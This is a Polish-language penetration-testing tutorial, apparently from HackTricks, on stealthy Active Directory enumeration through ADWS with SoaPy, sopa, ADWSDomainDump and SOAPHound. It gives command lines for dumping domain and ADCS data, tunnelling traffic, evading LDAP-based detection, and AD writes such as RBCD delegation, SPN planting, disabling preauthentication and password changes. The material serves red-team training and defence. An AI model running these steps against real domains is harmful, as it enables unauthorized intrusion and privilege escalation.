# Enumeracja Active Directory Web Services (ADWS) i skryte pozyskiwanie danych

{{#include ../../banners/hacktricks-training.md}}

## Czym jest ADWS?

Active Directory Web Services (ADWS) jest **domyślnie włączone na każdym kontrolerze domeny od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Pomimo nazwy **nie korzysta z HTTP**. Zamiast tego usługa udostępnia dane w stylu LDAP za pośrednictwem stosu zastrzeżonych protokołów ramkowania .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany w tych binarnych ramkach SOAP i przesyłany przez nietypowy port, **enumeracja za pośrednictwem ADWS jest znacznie mniej narażona na inspekcję, filtrowanie lub wykrycie na podstawie sygnatur niż klasyczny ruch LDAP/389 i 636**. Dla operatorów oznacza to:<sup>[[1]](#references)[[7]](#references)</sup>

* Bardziej skryty rekonesans – zespoły Blue Team często skupiają się na zapytaniach LDAP.
* Możliwość pozyskiwania danych z **hostów innych niż Windows (Linux, macOS)** przez tunelowanie 9389/TCP przez proxy SOCKS.
* Te same dane, które można uzyskać przez LDAP (użytkownicy, grupy, ACL, schemat itd.), oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

Interakcje z ADWS są realizowane za pośrednictwem WS-Enumeration: każde zapytanie rozpoczyna się komunikatem `Enumerate`, który definiuje filtr/atrybuty LDAP i zwraca GUID `EnumerationContext`, po czym następuje co najmniej jeden komunikat `Pull`, przesyłający wyniki w ramach okna określonego przez serwer.<sup>[[7]](#references)</sup> Konteksty wygasają po około 30 minutach, więc narzędzia muszą stronicować wyniki lub dzielić filtry (zapytania prefiksowe dla każdego CN), aby uniknąć utraty stanu.<sup>[[8]](#references)</sup> Przy pobieraniu deskryptorów zabezpieczeń należy określić kontrolkę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACL; w przeciwnym razie ADWS po prostu pomija atrybut `nTSecurityDescriptor` w odpowiedzi SOAP.

> UWAGA: ADWS jest również używane przez wiele narzędzi RSAT GUI/PowerShell, więc taki ruch może przypominać legalną aktywność administratorów.

## SoaPy – natywny klient Python

[SoaPy](https://github.com/logangoins/soapy) to **pełna implementacja stosu protokołów ADWS napisana w czystym Pythonie**. Tworzy ramki NBFX/NBFSE/NNS/NMF bajt po bajcie, umożliwiając pozyskiwanie danych z systemów uniksopodobnych bez korzystania ze środowiska uruchomieniowego .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Najważniejsze funkcje

* Obsługa **połączeń przez proxy SOCKS** (przydatna w przypadku implantów C2).
* Szczegółowe filtry wyszukiwania identyczne z LDAP, np. `-q '(objectClass=user)'`.
* Opcjonalne operacje **zapisu** (`--set` / `--delete`).
* Tryb wyjściowy **BOFHound** do bezpośredniego importu do BloodHound.<sup>[[3]](#references)</sup>
* Flaga `--parse` formatująca znaczniki czasu / `userAccountControl`, gdy potrzebna jest czytelna dla człowieka postać danych.<sup>[[2]](#references)</sup>

### Flagi ukierunkowanego pozyskiwania danych i operacje zapisu

SoaPy zawiera zestaw wyselekcjonowanych przełączników, które odwzorowują najczęstsze zadania związane z wyszukiwaniem w LDAP za pośrednictwem ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, a także parametry `--query` / `--filter` do tworzenia własnych zapytań. Można je łączyć z operacjami zapisu, takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (przygotowuje SPN do ukierunkowanego Kerberoasting) oraz `--asrep` (ustawia `DONT_REQ_PREAUTH` w `userAccountControl`).<sup>[[2]](#references)</sup>

Przykład ukierunkowanego wyszukiwania SPN, które zwraca wyłącznie `samAccountName` i `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Użyj tego samego hosta/poświadczeń, aby od razu wykorzystać ustalenia: wyświetl obiekty obsługujące RBCD za pomocą `--rbcds`, a następnie użyj `--rbcd 'WEBSRV01$' --account 'FILE01$'`, aby przygotować łańcuch Resource-Based Constrained Delegation (pełny przebieg nadużycia opisano w sekcji [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Instalacja (host operatora)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump przez ADWS (Linux/Windows)

* Fork `ldapdomaindump`, który zastępuje zapytania LDAP wywołaniami ADWS przez TCP/9389, aby ograniczyć wykrywanie sygnatur LDAP.
* Wykonuje wstępne sprawdzenie dostępności portu 9389, chyba że przekazano `--force` (pomija sondowanie, jeśli skanowanie portów generuje dużo szumu lub jest filtrowane).
* W README opisano udane obejście zabezpieczeń przetestowane z Microsoft Defender for Endpoint i CrowdStrike Falcon.<sup>[[4]](#references)</sup>

### Instalacja

```bash
pipx install .
```

### Użycie

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Typowy wynik loguje sprawdzenie dostępności portu 9389, bind ADWS oraz rozpoczęcie i zakończenie zrzutu:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Praktyczny klient ADWS w Golang

Podobnie jak soapy, [sopa](https://github.com/Macmod/sopa) implementuje stos protokołów ADWS (MS-NNS + MC-NMF + SOAP) w Golang, udostępniając flagi wiersza poleceń do wykonywania wywołań ADWS, takich jak:<sup>[[5]](#references)</sup>

* **Wyszukiwanie i pobieranie obiektów** - `query` / `get`
* **Cykl życia obiektów** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Edycja atrybutów** - `attr [add|replace|delete]`
* **Zarządzanie kontami** - `set-password` / `change-password`
* oraz inne, takie jak `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` itd.

### Najważniejsze informacje o mapowaniu protokołów

* Wyszukiwanie w stylu LDAP odbywa się za pośrednictwem **WS-Enumeration** (`Enumerate` + `Pull`) z wyborem atrybutów, kontrolą zakresu (Base/OneLevel/Subtree) i stronicowaniem.
* Pobieranie pojedynczego obiektu korzysta z **WS-Transfer** `Get`; zmiany atrybutów używają `Put`, a usuwanie — `Delete`.
* Wbudowane tworzenie obiektów korzysta z **WS-Transfer ResourceFactory**; obiekty niestandardowe są tworzone za pomocą żądania **IMDA AddRequest** opartego na szablonach YAML.
* Operacje na hasłach to akcje **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Odkrywanie metadanych bez uwierzytelniania (mex)

ADWS udostępnia WS-MetadataExchange bez poświadczeń, co pozwala szybko sprawdzić, czy usługa jest dostępna, przed uwierzytelnieniem:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Uwagi dotyczące wykrywania DNS/DC i określania celów Kerberos

Sopa może wyszukiwać DC za pomocą rekordów SRV, jeśli pominięto `--dc` i podano `--domain`. Wysyła zapytania w tej kolejności i używa celu o najwyższym priorytecie:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operacyjnie, aby uniknąć błędów w środowiskach segmentowanych, preferuj resolver kontrolowany przez DC:

* Użyj `--dns <DC-IP>`, aby wszystkie wyszukiwania SRV/PTR/przekazywane były wykonywane przez DNS DC.
* Użyj `--dns-tcp`, gdy UDP jest blokowany lub odpowiedzi SRV są duże.
* Jeśli Kerberos jest włączony, a `--dc` zawiera adres IP, sopa wykonuje **odwrotne wyszukiwanie PTR**, aby uzyskać FQDN do prawidłowego określenia SPN/KDC. Jeśli Kerberos nie jest używany, wyszukiwanie PTR nie jest wykonywane.

Przykład (IP + Kerberos, wymuszenie użycia DNS przez DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opcje materiału uwierzytelniającego

Oprócz haseł w postaci jawnej sopa obsługuje **hashe NT**, **klucze Kerberos AES**, **ccache** oraz **certyfikaty PKINIT** (PFX lub PEM) do uwierzytelniania ADWS. Użycie `--aes-key`, `-c` (ccache) lub opcji opartych na certyfikatach oznacza użycie Kerberos.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Tworzenie obiektów niestandardowych za pomocą szablonów

W przypadku dowolnych klas obiektów polecenie `create custom` korzysta z szablonu YAML mapowanego na żądanie IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` i `rdn` określają kontener i względną nazwę wyróżniającą.
* `attributes[].name` obsługuje `cn` lub nazwy z przestrzenią nazw, takie jak `addata:cn`.
* `attributes[].type` akceptuje `string|int|bool|base64|hex` lub jawne `xsd:*`.
* **Nie** dodawaj `ad:relativeDistinguishedName` ani `ad:container-hierarchy-parent`; `sopa` wstawia je automatycznie.
* Wartości `hex` są konwertowane na `xsd:base64Binary`; użyj `value: ""`, aby ustawić pusty ciąg.

## SOAPHound – zbieranie danych ADWS na dużą skalę (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) to kolektor .NET, który obsługuje wszystkie interakcje LDAP przez ADWS i generuje pliki JSON zgodne z BloodHound v4. Jednorazowo tworzy pełną pamięć podręczną `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a następnie używa jej ponownie podczas przebiegów `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (DNS zintegrowany z AD) na dużą skalę, dzięki czemu kontroler domeny opuszcza zaledwie około 35 kluczowych atrybutów. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania według prefiksu CN, aby nie przekroczyć 30-minutowego limitu czasu EnumerationContext w dużych lasach.<sup>[[8]](#references)</sup>

Typowy przebieg pracy na maszynie wirtualnej operatora dołączonej do domeny:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Wyeksportowane sloty JSON można bezpośrednio wykorzystać w workflowach SharpHound/BloodHound — zobacz [metodologię BloodHound](bloodhound.md), aby poznać pomysły na dalszą wizualizację grafów. AutoSplit sprawia, że SOAPHound działa niezawodnie w lasach liczących miliony obiektów, ograniczając jednocześnie liczbę zapytań w porównaniu ze snapshotami w stylu ADExplorer.

## Stealth AD Collection Workflow

Poniższy workflow pokazuje, jak enumerować **obiekty domeny i ADCS** za pośrednictwem ADWS, konwertować je do formatu JSON BloodHound i wyszukiwać ścieżki ataku oparte na certyfikatach — wszystko z poziomu Linuxa:

1. **Przekieruj ruch przez tunel na porcie 9389/TCP** z sieci docelowej do swojego komputera (np. za pomocą Chisel, Meterpreter, dynamicznego przekierowania portów SSH itp.). Ustaw `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj opcji `--proxyHost/--proxyPort` w SoaPy.

2. **Zbierz obiekt domeny głównej:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Zbierz obiekty związane z ADCS z Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Konwertuj do BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Prześlij ZIP** w interfejsie GUI BloodHound i uruchom zapytania Cypher, takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, aby ujawnić ścieżki eskalacji związane z certyfikatami (ESC1, ESC8 itd.).

### Zapisywanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Połącz to z `s4u2proxy`/`Rubeus /getticket`, aby uzyskać pełny łańcuch **Resource-Based Constrained Delegation** (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| Enumeracja ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| Zrzut ADWS na dużą skalę | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, najpierw cache, tryby BH/ADCS/DNS |
| Import do BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Przejęcie certyfikatu | [Certipy](https://github.com/ly4k/Certipy) | Można przekierować przez ten sam SOCKS |
| Enumeracja ADWS i zmiany obiektów | [sopa](https://github.com/Macmod/sopa) | Uniwersalny klient do komunikacji ze znanymi endpointami ADWS — umożliwia enumerację, tworzenie obiektów, modyfikowanie atrybutów i zmianę haseł |

## References

- [1] [SpecterOps – Pamiętaj, aby używać SOAP(y) – przewodnik operatora po ukrytym zbieraniu danych AD za pomocą ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy na GitHubie](https://github.com/logangoins/soapy)
- [3] [BOFHound na GitHubie](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump na GitHubie](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa na GitHubie](https://github.com/Macmod/sopa)
- [6] [Microsoft – specyfikacje MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Ukryta enumeracja środowisk Active Directory za pomocą ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Narzędzie SOAPHound do zbierania danych Active Directory za pomocą ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
